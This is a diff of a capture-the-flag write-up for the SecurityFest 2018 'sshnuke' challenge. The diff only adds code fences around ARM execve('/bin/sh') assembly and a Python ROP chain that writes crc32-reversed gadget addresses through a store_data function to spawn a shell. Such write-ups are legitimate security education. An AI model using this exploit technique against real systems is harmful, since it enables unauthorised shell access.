@@ -17,6 +17,7 @@ Same vulnerability in read_store function => can leak, but ASLR was off, so leak
 
 On ARM syscall execve got following structure:
 
+```
 syscall execve("/bin/sh", argv, env) => execve("/bin/sh", 0, 0)
 
 add r0, 0x099014   ; /bin/sh addr
@@ -24,7 +25,7 @@ mov r1, #0
 mov r2, #0
 mov r7, #11        ; number of execve() syscall 
 svc #0             ; syscall
-
+```
 
 0x099014 - is address where login string is placed:
 
@@ -50,6 +51,7 @@ So we have to do reverse crc32. I used script from https://github.com/theonlypwn
 
 Final rop:
 
+```python
 login('/bin/sh\x00')
 
 store_data(14, crc32_reverse(pop_r1_pc), True, False)
@@ -62,6 +64,7 @@ store_data(20, crc32_reverse(pop_r0_r4_pc), True, True)
 store_data(21, crc32_reverse(login_str_addr), True, True)
 store_data(22, crc32_reverse(0), True, True)
 store_data(23, crc32_reverse(mov_r4_r2_blx_r3), False, True)
+```
 
 ![](/images/SecurityFestCTF2018/sshnuke/04.png)
  
